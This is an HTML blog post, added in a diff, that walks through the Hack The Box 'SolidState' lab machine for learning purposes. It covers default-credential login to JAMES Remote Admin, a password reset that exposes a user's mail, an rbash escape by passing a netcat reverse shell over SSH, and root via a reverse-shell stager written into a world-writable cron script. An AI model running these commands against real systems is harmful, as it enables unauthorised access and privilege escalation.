@@ -1,0 +1,363 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | SolidState - Hack The Box</title>
+  <meta name="description" content="Resolution of the SolidState machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="SolidState - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/solidstate">
+  <meta property="og:description" content="Resolution of the SolidState machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/solidstate">
+  <meta name="twitter:title" content="SolidState - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the SolidState machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/solidstate/solidstate-00-03d6df8098c4b4f3363b3d5c5844239ee36294abc9d4b05641deb19f8a7757aa.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/solidstate/solidstate-00-03d6df8098c4b4f3363b3d5c5844239ee36294abc9d4b05641deb19f8a7757aa.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>SolidState - Hack The Box</h1>
+            <p>Resolution of the SolidState machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    November 7, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      4 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/solidstate/solidstate-00-03d6df8098c4b4f3363b3d5c5844239ee36294abc9d4b05641deb19f8a7757aa.png">
+  <img src="/assets/hackthebox/solidstate/solidstate-00-03d6df8098c4b4f3363b3d5c5844239ee36294abc9d4b05641deb19f8a7757aa.png" alt="SolidState banner" class="zooming" data-rjs="/assets/hackthebox/solidstate/solidstate-00-03d6df8098c4b4f3363b3d5c5844239ee36294abc9d4b05641deb19f8a7757aa.png" data-zooming-width="595" data-zooming-height="376" />
+</a></p>
+
+<p>SolidState is a medium level machine, based on Linux. The main point is based on <code class="highlighter-rouge">mail management</code>, including protocols like <code class="highlighter-rouge">POP3</code> and SMTP.
+The initial exploitation is based on a vulnerability that exists in <code class="highlighter-rouge">JAMES Remote Admin 2.3.2</code>
+The privilege escalation process relies on a <code class="highlighter-rouge">Python script</code>, owned by root but available to other users, so any user is able to edit that script.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sun May 17 07:55:23 2020 as: nmap -sC -sV -oA solidstate -p- -T5 --min-parallelism=50 -n --min-rate=300 10.10.10.51</span>
+Warning: 10.10.10.51 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>10.10.10.51
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp   open  smtp        JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>10.10.14.37 <span class="o">[</span>10.10.14.37]<span class="o">)</span>, 
+80/tcp   open  http        Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Home - Solid State Security
+110/tcp  open  pop3        JAMES pop3d 2.3.2
+119/tcp  open  nntp        JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
+4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+Service Info: Host: solidstate<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun May 17 07:58:53 2020 -- 1 IP address (1 host up) scanned in 209.82 seconds</span></code></pre></figure>
+
+<p>Nmap reveal us some mail services running on the machine, including an interesting service named <code class="highlighter-rouge">James Remote Admin 2.3.2</code></p>
+
+<h1 id="exploiting---getting-an-exploit-with-a-simple-recon">Exploiting - Getting an exploit with a simple recon</h1>
+
+<p>Googling in search for some exploits available for <code class="highlighter-rouge">James Remote Admin version 2.3.2</code> we got the following Exploit-DB exploit:</p>
+
+<p><a href="/assets/hackthebox/solidstate/solidstate-01-ef2a0f47f6beea1ee64886799e39287ea1dcf248edcaa4d062f38d29a8973e88.png">
+  <img src="/assets/hackthebox/solidstate/solidstate-01-ef2a0f47f6beea1ee64886799e39287ea1dcf248edcaa4d062f38d29a8973e88.png" alt="SolidState Exploiting" class="zooming" data-rjs="/assets/hackthebox/solidstate/solidstate-01-ef2a0f47f6beea1ee64886799e39287ea1dcf248edcaa4d062f38d29a8973e88.png" data-zooming-width="1028" data-zooming-height="537" />
+</a></p>
+
+<p><a href="https://www.exploit-db.com/exploits/35513" target="_blank">Apache James Server 2.3.2 - Remote Command Execution</a></p>
+
+<p>It’s a script that login using the default credentials (<code class="highlighter-rouge">root:root</code>), create an user and add a malicious command to be executed as RCE when some user receives an email.</p>
+
+<p>But we can reuse these default credentials to change the password of an already existing user and follow the SMTP path.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">telnet 10.10.10.51 4555</code></pre></figure>
+
+<p>After the authentication using the default credentials, we are going to list all users with the <code class="highlighter-rouge">listusers</code> command and after that let’s change the password of the <code class="highlighter-rouge">mindy</code> user with the following command:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">setpassword mindy nullarmor</code></pre></figure>
+
+<p><a href="/assets/hackthebox/solidstate/solidstate-02-a79243beb5b2478fd323e5868659c15cb90ae277e064ca7ee363dc45bd5ccc4c.png">
+  <img src="/assets/hackthebox/solidstate/solidstate-02-a79243beb5b2478fd323e5868659c15cb90ae277e064ca7ee363dc45bd5ccc4c.png" alt="SolidState Exploiting" class="zooming" data-rjs="/assets/hackthebox/solidstate/solidstate-02-a79243beb5b2478fd323e5868659c15cb90ae277e064ca7ee363dc45bd5ccc4c.png" data-zooming-width="995" data-zooming-height="716" />
+</a></p>
+
+<p>After that we’re able to login at POP3 service with our new credentials (<code class="highlighter-rouge">mindy:nullarmor</code>) :</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">telnet 10.10.10.51 110
+USER mindy
+PASS nullarmor</code></pre></figure>
+
+<p>Now we can list for all e-mails with the command <code class="highlighter-rouge">LIST</code>. To retrieve the e-mail content we can use the <code class="highlighter-rouge">RETR</code> command:</p>
+
+<p><a href="/assets/hackthebox/solidstate/solidstate-03-0b3496b3281d0ada898d363fa60767c9993db6df79591dd489787761b7b27e99.png">
+  <img src="/assets/hackthebox/solidstate/solidstate-03-0b3496b3281d0ada898d363fa60767c9993db6df79591dd489787761b7b27e99.png" alt="SolidState Exploiting" class="zooming" data-rjs="/assets/hackthebox/solidstate/solidstate-03-0b3496b3281d0ada898d363fa60767c9993db6df79591dd489787761b7b27e99.png" data-zooming-width="1123" data-zooming-height="797" />
+</a></p>
+
+<p>So now we got the SSH credentials from the above e-mail, time to login on SSH and capture the first flag!</p>
+
+<p><a href="/assets/hackthebox/solidstate/solidstate-04-ef9244a9eba78f64dd00fbcf0d9cd4d64cfa29ef79e503a62c1dbfcbf7b5b4d4.png">
+  <img src="/assets/hackthebox/solidstate/solidstate-04-ef9244a9eba78f64dd00fbcf0d9cd4d64cfa29ef79e503a62c1dbfcbf7b5b4d4.png" alt="SolidState Exploiting" class="zooming" data-rjs="/assets/hackthebox/solidstate/solidstate-04-ef9244a9eba78f64dd00fbcf0d9cd4d64cfa29ef79e503a62c1dbfcbf7b5b4d4.png" data-zooming-width="569" data-zooming-height="256" />
+</a></p>
+
+<h1 id="post-exploitation---escaping-from-a-restricted-shell-and-abusing-scripts-with-global-permissions">Post Exploitation - Escaping from a restricted shell and abusing scripts with global permissions</h1>
+
+<p>The first thing that we noticed is the state of our current shell, it’s a <code class="highlighter-rouge">restricted shell</code> named <code class="highlighter-rouge">rbash</code> that blocks a huge number of commands.</p>
+
+<p>A way to bypass this restriction is authenticating through SSH using a <code class="highlighter-rouge">reverse shell payload as in-line argument</code>.</p>
+
+<p>We can do this with the following command:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">ssh mindy@10.10.10.51 <span class="s2">"nc -e /bin/bash 10.10.14.XX 1337"</span></code></pre></figure>
+
+<p>In another terminal we wait for the reverse connection using a netcat on listening mode and after that we got a shell without restrictions!</p>
+
+<p><a href="/assets/hackthebox/solidstate/solidstate-05-ed33989c4fed3f78747e90bb4b37d5f5a09887c71b20ae841a8dfd76bce3293c.png">
+  <img src="/assets/hackthebox/solidstate/solidstate-05-ed33989c4fed3f78747e90bb4b37d5f5a09887c71b20ae841a8dfd76bce3293c.png" alt="SolidState Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/solidstate/solidstate-05-ed33989c4fed3f78747e90bb4b37d5f5a09887c71b20ae841a8dfd76bce3293c.png" data-zooming-width="1721" data-zooming-height="216" />
+</a></p>
+
+<p>So now we can jump to the privilege escalation phase.</p>
+
+<p>There’s an interesting Python script file located under <code class="highlighter-rouge">/opt</code> named <code class="highlighter-rouge">tmp.py</code> that is wrongly <code class="highlighter-rouge">configured with global permissions</code>, which means that everyone can edit this file.
+The mentioned script has the following content:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="k">try</span><span class="p">:</span>
+     <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'rm -r /tmp/* '</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+     <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span></code></pre></figure>
+
+<p>After a while we noticed that this file is executed by the root user every 1 or 2 minutes through cronjob, so now everything that we need to do is <code class="highlighter-rouge">change the content of the script</code>.
+Let’s place a reverse shell stager inside the script and set up a netcat listener to catch up our privileged shell:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">"import os;os.system('nc -e /bin/bash 10.10.14.42 1338')"</span> <span class="o">&gt;</span> tmp.py</code></pre></figure>
+
+<p>After some time we got the shell as root user and the last flag!</p>
+
+<p><a href="/assets/hackthebox/solidstate/solidstate-06-1c2996d681ecafcfbf4c40ceecd29699aa96fc29da6bf9828c027a0e8bd53772.png">
+  <img src="/assets/hackthebox/solidstate/solidstate-06-1c2996d681ecafcfbf4c40ceecd29699aa96fc29da6bf9828c027a0e8bd53772.png" alt="SolidState Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/solidstate/solidstate-06-1c2996d681ecafcfbf4c40ceecd29699aa96fc29da6bf9828c027a0e8bd53772.png" data-zooming-width="676" data-zooming-height="156" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=SolidState+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/solidstate%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/solidstate" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
